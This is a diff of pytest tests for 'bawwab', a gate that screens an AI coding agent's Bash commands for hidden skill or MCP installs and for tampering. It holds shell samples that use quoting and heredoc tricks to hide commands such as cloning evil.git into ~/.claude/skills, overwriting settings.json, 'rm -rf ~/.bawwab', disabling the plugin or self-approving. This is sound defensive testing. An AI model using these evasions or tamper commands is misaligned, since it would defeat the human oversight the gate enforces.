@@ -1043,3 +1043,175 @@ def test_r24_many_regions_with_heredoc_op_fail_closed(home, cmd):
 
 def test_r24_many_regions_without_heredoc_op_still_none(home):
     assert detect_install(bash("(( a = 1 )); (( b = 2 )); (( c = 3 )); (( d = 4 )); echo $(( a + b ))")) is None
+
+
+# ------------------------------------------------------------- R25: raw-text backstop
+
+_HX = "\nfoo '\nX\n'\n" + _E + "\necho '"  # hides _E iff `<<X` before it is read as a heredoc
+_F = "echo $((1)) $((2)) $((3))\n"
+
+_R25_HIDDEN = [
+    # 1. comment containing a quote
+    "echo a #'\n" + _E + "\n'",
+    "let a #'\n" + _E + "\n'",
+    "let a=1 #'\n" + _E + "\n'",
+    _F + "let a #'\n(( 1 # )) ; " + _E + "\n'",
+    _F + "let a=1 #'\n(( 1 # )) ; " + _E + "\n'",
+    _F + "let a=1 `'`\n" + _E + "\n'",
+    # 2. region finder misses
+    "(( $(case x in a) echo;; esac) << X ))" + _HX,
+    "(( $( : # )\n) << X ))" + _HX,
+    "(( $'\\'' << X ))" + _HX,
+    "(( $'\\')' << X ))" + _HX,
+    # 3. contexts outside R24
+    "a[1<<X]=1" + _HX,
+    "a[ 1 << X ]=1" + _HX,
+    "a[1<<X]+=1" + _HX,
+    "echo ${a[1<<X]}" + _HX,
+    "echo ${a:0:1<<X}" + _HX,
+    "echo ${a/<<X/}" + _HX,
+    "echo ${a:-<<X}" + _HX,
+    # 4. heredoc inside a double-quoted command substitution
+    'echo "$(cat <<X\n"\nX\n)"\n' + _E + '\n"',
+    'echo "`cat <<X\n"\nX\n`"\n' + _E + '\n"',
+    # 5. ANSI-C quoting at top level
+    "echo $'\\''\n" + _E + "\n'",
+    "((cat $'\\'))' <<X ) )\nX\n" + _E + "\n'",
+]
+
+
+@pytest.mark.parametrize("cmd", _R25_HIDDEN)
+def test_r25_hidden_line_detected(home, cmd):
+    r = detect_install(bash(cmd))
+    assert isinstance(r, Protected) or (isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets]), r
+
+
+def test_r25_hidden_line_prefilter_superset(home):
+    hook = _load_hook()
+    for cmd in _R25_HIDDEN:
+        assert detect_install(bash(cmd)) is not None, cmd
+        assert hook.prefilter({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": "/tmp"}), cmd
+
+
+_HC = "echo a #'\n{}\n'"  # comment-quote hiding
+
+
+def test_r25_hidden_cd_then_clone(home):
+    (home / ".claude" / "skills").mkdir(parents=True, exist_ok=True)
+    cmd = _HC.format("cd ~/.claude/skills; git clone https://example.invalid/evil.git")
+    r = detect_install(bash(cmd))
+    assert isinstance(r, Targets) and [t.kind for t in r.targets] == ["git"], r
+
+
+def test_r25_hidden_cd_cannot_be_masked_by_a_fake_cd(home):
+    (home / ".claude" / "skills").mkdir(parents=True, exist_ok=True)
+    cmd = _HC.format('cd ~/.claude/skills; echo "; cd /tmp; "; git clone https://example.invalid/evil.git')
+    r = detect_install(bash(cmd))
+    assert isinstance(r, Targets) and [t.kind for t in r.targets] == ["git"], r
+
+
+@pytest.mark.parametrize("payload", [
+    "echo {} > ~/.claude/settings.json",
+    "tee ~/.claude.json < /tmp/x",
+    "mv ~/.claude /tmp/x",
+    "rm -rf ~/.bawwab",
+    "claude plugin disable bawwab",
+    "claude mcp add-from-claude-desktop",
+    "bawwab approve abcd",
+    "if true; then claude mcp add-from-claude-desktop; fi",
+])
+def test_r25_hidden_protected_actions(home, payload):
+    r = detect_install(bash(_HC.format(payload)))
+    assert isinstance(r, Protected), r
+
+
+@pytest.mark.parametrize("cmd", [
+    'git commit -m "fix: update README"',
+    'echo "use ~/.claude/skills for skills"',
+    "for ((i=0;i<3;i++)); do echo $i; done",
+    "cat ~/.claude.json | jq .",
+    "grep -r mcpServers .",
+    'git commit -m "docs: explain claude mcp add and bawwab approve"',
+    'echo "see ~/.claude.json and ~/.bawwab/config.json"',
+    "git commit -m \"note: python3 -c 'open(\\\".claude/settings.json\\\")'\"",
+    "echo 'python3 -c \"print(1)\" ~/.claude/settings.json'",
+])
+def test_r25_benign_is_none(home, cmd):
+    assert detect_install(bash(cmd)) is None
+
+
+def test_r25_quoted_install_args_add_no_protected_reason(home):
+    r = detect_install(bash('claude mcp add gh -e "GITHUB_TOKEN=x" -- npx -y "@modelcontextprotocol/server-github"'))
+    assert isinstance(r, Targets) and [t.name for t in r.targets] == ["@modelcontextprotocol/server-github"], r
+    assert r.protected == [], r.protected
+
+
+def test_r25_raw_pass_has_no_interpreter_heuristic(home):
+    # the structured pass sees an interpreter mentioning a config path; the raw pieces must not add more
+    r = detect_install(bash("echo 'x' #'\npython3 -c pass .claude/skills\n'"))
+    assert r is None, r
+
+
+def _body(n: int) -> str:
+    line = "echo hello world 'quoted text' \"dq $HOME\" | grep -v foo > /tmp/out.txt\n"
+    return line * (n // len(line))
+
+
+@pytest.mark.parametrize("cmd,limit", [
+    ("(( a << 1 )); (( b << 2 )); (( c << 3 ))\n" + _body(100_000) + _E, 0.3),
+    ("(( a << 1 )); (( b << 2 )); (( c << 3 )); " + "echo hello world; " * 5500 + _E, 0.3),
+    ("(( a << 1 )); (( b )); (( c ))\n" + _body(100_000) + _E, 0.3),
+    ("(( a << 1 )); (( b )); (( c )); " + "echo hello world; " * 5500 + _E, 0.3),
+    ("(( a << 1 ))\n" + _body(300_000) + _E, 1.5),
+    ("(( a << 1 )); " + "echo hello world; " * 16600 + _E, 1.5),
+])
+def test_r25_perf_targets(home, cmd, limit):
+    r, dt = _timed(cmd)
+    assert dt < limit, dt
+    assert _detected_or_too_complex(r), r
+
+
+def test_r25_too_complex_decided_before_any_pass(home, monkeypatch):
+    import bawwab.gate.detect as d
+    calls: list[int] = []
+    orig = d._bash_pass
+    monkeypatch.setattr(d, "_bash_pass", lambda *a, **k: calls.append(1) or orig(*a, **k))
+    cmd = "(( a << 1 )); (( b << 2 )); (( c << 3 ))\n" + _body(250_000) + _E  # 3 regions, 8 readings
+    r, dt = _timed(cmd)
+    assert isinstance(r, Protected) and r.reason == "command too complex to analyse", r
+    assert calls == [] and dt < 0.3, (calls, dt)
+
+
+def test_r25_protected_payloads_prefilter_superset(home):
+    hook = _load_hook()
+    for payload in ["echo {} > ~/.claude/settings.json", "mv ~/.claude /tmp/x", "rm -rf ~/.bawwab",
+                    "claude plugin disable bawwab", "bawwab approve abcd",
+                    "echo {} > ~/.cl$'a'ude/settings.json"]:
+        cmd = _HC.format(payload)
+        assert detect_install(bash(cmd)) is not None, cmd
+        assert hook.prefilter({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": "/tmp"}), cmd
+
+
+def test_r25_multiline_add_json_is_read_whole(home):
+    spec = "'{\n  \"command\": \"npx\",\n  \"args\": [\"-y\", \"okpkg\"]\n}'"
+    r = detect_install(bash(f"claude mcp add-json x {spec}"))
+    assert isinstance(r, Targets) and [t.name for t in r.targets] == ["okpkg"] and r.protected == [], r
+    hidden = "echo a #'\nclaude mcp add-json x '{\"command\": \"npx\",\n\"args\": [\"evilpkg\"]}'\n'"
+    r = detect_install(bash(hidden))
+    assert isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets], r
+
+
+@pytest.mark.parametrize("cmd", [
+    "claude mcp add x -- npx -c 'echo hi' okpkg",
+    "claude mcp add -t sse -H 'Authorization: Bearer x' s https://mcp.example.com/sse",
+])
+def test_r25_visible_quoted_args_get_no_spurious_target(home, cmd):
+    r = detect_install(bash(cmd))
+    assert isinstance(r, Targets) and len(r.targets) == 1 and r.protected == [], r
+
+
+def test_r25_subshell_cd_does_not_hide_the_start_cwd(home):
+    (home / ".claude" / "skills").mkdir(parents=True, exist_ok=True)
+    (home / "evil").mkdir(exist_ok=True)
+    r = detect_install(bash("(cd /tmp); cp -r ../evil skills/x", cwd=str(home / ".claude")))
+    assert isinstance(r, Targets) and r.targets[0].path == str(home / "evil"), r
